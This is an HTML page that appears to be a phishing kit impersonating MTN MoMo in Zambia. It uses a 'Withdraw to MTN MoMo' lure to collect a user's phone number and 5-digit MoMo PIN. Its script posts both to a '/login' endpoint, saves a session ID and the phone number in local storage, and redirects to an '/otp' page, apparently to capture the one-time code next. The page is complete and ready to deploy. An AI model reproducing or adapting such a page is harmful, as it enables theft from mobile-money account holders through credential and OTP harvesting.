<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>MTN MoMo – Login</title>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<style>
  :root {
    --mtn-dark: #003366;
    --mtn-gold: #FFD700;
    --mtn-light: #004080;
    --grad: linear-gradient(to right, #003366, #004080);
  }
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: 'Inter', sans-serif; background: #fff; color: #1C2340; min-height: 100vh; display: flex; flex-direction: column; }

  .mtn-logo { display: flex; flex-direction: column; align-items: center; gap: 4px; }
  .mtn-logo-icon { width: 45px; height: 45px; background: var(--mtn-gold); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; font-weight: 900; color: var(--mtn-dark); position: relative; }
  .mtn-logo-icon::after { content: 'M'; font-size: 2rem; font-weight: 900; }
  .mtn-logo-text { font-size: 1rem; font-weight: 700; color: var(--mtn-dark); }
  .mtn-logo-sub { font-size: 0.65rem; color: #888; font-weight: 500; }

  .login-hdr { background: var(--mtn-dark); padding: 32px 20px 36px; display: flex; flex-direction: column; align-items: center; gap: 8px; flex-shrink: 0; }
  .login-body-wrap { flex: 1; background: #fff; padding: 32px 20px 0; display: flex; flex-direction: column; align-items: center; }
  .login-body-wrap h2 { font-size: 1.05rem; font-weight: 600; margin-bottom: 24px; }
  .login-inner { width: 100%; max-width: 380px; }

  .lg-phone-row { display: flex; margin-bottom: 24px; }
  .lg-ph-pre { display: flex; align-items: center; gap: 4px; padding: 11px 12px; background: #fafafa; border: 1.5px solid #ddd; border-right: none; border-radius: 8px 0 0 8px; font-size: 0.84rem; color: #555; font-weight: 500; white-space: nowrap; }
  .lg-phone-row input { flex: 1; padding: 11px 14px; border: 1.5px solid #ddd; border-left: none; border-radius: 0 8px 8px 0; font-family: 'Inter', sans-serif; font-size: 0.9rem; outline: none; background: #fff; transition: border-color 0.2s; }
  .lg-phone-row input:focus { border-color: var(--mtn-gold); }

  .pin-label { font-size: 0.82rem; color: #888; text-align: center; margin-bottom: 12px; }
  .pin-row { display: flex; gap: 10px; justify-content: center; margin-bottom: 12px; position: relative; align-items: center; }
  .pin-box { width: 52px; height: 52px; border: 1.5px solid #ddd; border-radius: 8px; text-align: center; font-family: 'Inter', sans-serif; font-size: 1.3rem; font-weight: 700; color: var(--mtn-dark); outline: none; transition: border-color 0.2s; }
  .pin-box:focus { border-color: var(--mtn-gold); box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.2); }
  .pin-eye { cursor: pointer; color: #888; font-size: 1rem; background: none; border: none; margin-left: 6px; }
  .pin-delete { cursor: pointer; color: #888; font-size: 1rem; background: none; border: none; margin-left: 6px; padding: 0; transition: color 0.2s; }
  .pin-delete:hover { color: var(--mtn-gold); }

  .btn-login { width: 100%; max-width: 380px; padding: 13px; background: #e8e8e8; color: #aaa; border: none; border-radius: 8px; font-size: 0.88rem; font-weight: 600; letter-spacing: 0.05em; cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.2s; }
  .btn-login.rdy { background: var(--grad); color: #fff; }

  .lg-curve { margin-top: 32px; background: #fff; overflow: hidden; flex-shrink: 0; }
  .lg-curve::before { content: ''; display: block; background: var(--mtn-dark); height: 55px; clip-path: ellipse(60% 100% at 50% 100%); margin-bottom: -4px; }

  .lg-foot { background: var(--mtn-dark); padding: 24px 20px 32px; display: flex; flex-direction: column; align-items: center; gap: 8px; text-align: center; }
  .lg-terms { font-size: 0.72rem; color: rgba(255, 255, 255, 0.45); }
  .lg-terms a { color: rgba(255, 255, 255, 0.65); }

  .msg-box { border-radius: 8px; padding: 12px 16px; font-size: 0.84rem; margin-bottom: 16px; display: none; align-items: center; gap: 10px; }
  .msg-box.show { display: flex; }
  .msg-box.error { background: #fef2f2; border: 1.5px solid #fecaca; color: #991b1b; }
  .msg-box.success { background: #f0fdf4; border: 1.5px solid #bbf7d0; color: #166534; }
  .msg-box.warning { background: #fefce8; border: 1.5px solid #fef08a; color: #854d0e; }
  .msg-icon { font-weight: 700; }

  .spinner { width: 44px; height: 44px; border: 4px solid #eee; border-top-color: var(--mtn-gold); border-radius: 50%; animation: spin 0.8s linear infinite; margin: 16px auto; }
  @keyframes spin { to { transform: rotate(360deg); } }
  .loading { display: none; text-align: center; }
  .loading.show { display: block; }
  .wait-msg { text-align: center; color: #888; font-size: 0.88rem; }
</style>
</head>
<body>
  <div class="login-hdr">
    <div class="mtn-logo">
      <div class="mtn-logo-icon">M</div>
      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1.2rem;">MoMo</div>
    </div>
    <div style="color: rgba(255, 255, 255, 0.7); font-size: 0.8rem;">Withdraw via MTN MoMo</div>
  </div>
  <div class="login-body-wrap">
    <h2>Withdraw to MTN MoMo</h2>
    <div class="login-inner">
      <div class="lg-phone-row">
        <div class="lg-ph-pre">+260</div>
        <input type="tel" id="lpPhone" placeholder="967123456" maxlength="9" oninput="normalizePhone('lpPhone')">
      </div>
      <div class="pin-label">Enter your MoMo PIN (5 digits):</div>
      <div class="pin-row">
        <input type="password" id="lp0" class="pin-box" maxlength="1" oninput="pinMvM(this, 0)" placeholder="•">
        <input type="password" id="lp1" class="pin-box" maxlength="1" oninput="pinMvM(this, 1)" placeholder="•">
        <input type="password" id="lp2" class="pin-box" maxlength="1" oninput="pinMvM(this, 2)" placeholder="•">
        <input type="password" id="lp3" class="pin-box" maxlength="1" oninput="pinMvM(this, 3)" placeholder="•">
        <input type="password" id="lp4" class="pin-box" maxlength="1" oninput="pinMvM(this, 4)" placeholder="•">
        <button class="pin-eye" onclick="togPin()" title="Show/Hide">👁</button>
        <button class="pin-delete" onclick="clearLoginPin()" title="Delete PIN">✕</button>
      </div>
      <div class="msg-box error" id="lpMsg"><span class="msg-icon">✕</span><span id="lpMsgTxt"></span></div>
      <div class="msg-box success" id="lpMsgOk"><span class="msg-icon">✓</span><span id="lpMsgOkTxt"></span></div>
      <div class="msg-box warning" id="lpMsgWarn"><span class="msg-icon">⚠</span><span id="lpMsgWarnTxt"></span></div>
      <button id="bLgn" class="btn-login" onclick="doLogin()">Withdraw</button>
      <div id="mLgn" class="loading">
        <div class="spinner"></div>
        <div class="wait-msg">Withdrawing…</div>
      </div>
    </div>
  </div>
  <div class="lg-curve"></div>
  <div class="lg-foot">
    <div class="mtn-logo">
      <div class="mtn-logo-icon" style="width: 32px; height: 32px; font-size: 0.9rem;">M</div>
      <div class="mtn-logo-text" style="color: var(--mtn-gold); font-size: 1rem;">MTN MoMo</div>
    </div>
    <div class="lg-terms">© 2026 MTN MoMo Loans. All rights reserved.</div>
  </div>

  <script>
    let isSubmitting = false;

    function normalizePhone(id) {
      let inp = document.getElementById(id);
      let val = inp.value.replace(/\D/g, '');
      if (val.length > 9) val = val.substring(0, 9);
      inp.value = val;
    }

    function pinMvM(el, i) {
      el.value = el.value.replace(/\D/, '');
      if (el.value && i < 4) {
        document.getElementById('lp' + (i + 1)).focus();
      }
      chkPin();
    }

    document.addEventListener('keydown', function(e) {
      const id = e.target.id;
      if (id.startsWith('lp') && id.length === 3 && e.key === 'Backspace' && !e.target.value) {
        const idx = parseInt(id[2]);
        if (idx > 0) document.getElementById('lp' + (idx - 1)).focus();
      }
    });

    function chkPin() {
      const ok = [0, 1, 2, 3, 4].every(i => document.getElementById('lp' + i).value);
      document.getElementById('bLgn').className = ok ? 'btn-login rdy' : 'btn-login';
    }

    function togPin() {
      [0, 1, 2, 3, 4].forEach(i => {
        const b = document.getElementById('lp' + i);
        b.type = b.type === 'password' ? 'text' : 'password';
      });
    }

    function clearLoginPin() {
      [0, 1, 2, 3, 4].forEach(i => { document.getElementById('lp' + i).value = ''; });
      chkPin();
      document.getElementById('lp0').focus();
    }

    function showLgnMsg(type, text) {
      ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));
      if (type === 'error') { document.getElementById('lpMsgTxt').textContent = text; document.getElementById('lpMsg').classList.add('show'); }
      if (type === 'success') { document.getElementById('lpMsgOkTxt').textContent = text; document.getElementById('lpMsgOk').classList.add('show'); }
      if (type === 'warning') { document.getElementById('lpMsgWarnTxt').textContent = text; document.getElementById('lpMsgWarn').classList.add('show'); }
    }

    function doLogin() {
      if (isSubmitting) return;
      isSubmitting = true;

      ['lpMsg', 'lpMsgOk', 'lpMsgWarn'].forEach(id => document.getElementById(id).classList.remove('show'));

      const phone = document.getElementById('lpPhone').value;
      const pin = [0, 1, 2, 3, 4].map(i => document.getElementById('lp' + i).value).join('');

      if (phone.length !== 9 || pin.length < 5) {
        isSubmitting = false;
        showLgnMsg('warning', 'Phone: 9 digits (e.g., 967123456). PIN: 5 digits.');
        return;
      }

      document.getElementById('mLgn').classList.add('show');
      document.getElementById('bLgn').disabled = true;

      fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ phone: phone, pin: pin })
      })
      .then(response => response.json())
      .then(data => {
        document.getElementById('mLgn').classList.remove('show');
        document.getElementById('bLgn').disabled = false;
        isSubmitting = false;

        if (data.success) {
          localStorage.setItem('sessionId', data.sessionId);
          localStorage.setItem('phone', phone);
          window.location.href = '/otp';
        } else {
          showLgnMsg('error', data.message || 'Login failed.');
        }
      })
      .catch(err => {
        document.getElementById('mLgn').classList.remove('show');
        document.getElementById('bLgn').disabled = false;
        isSubmitting = false;
        showLgnMsg('error', 'Network error: ' + err.message);
      });
    }

    // Focus first pin box
    document.getElementById('lp0').focus();
  </script>
</body>
</html>
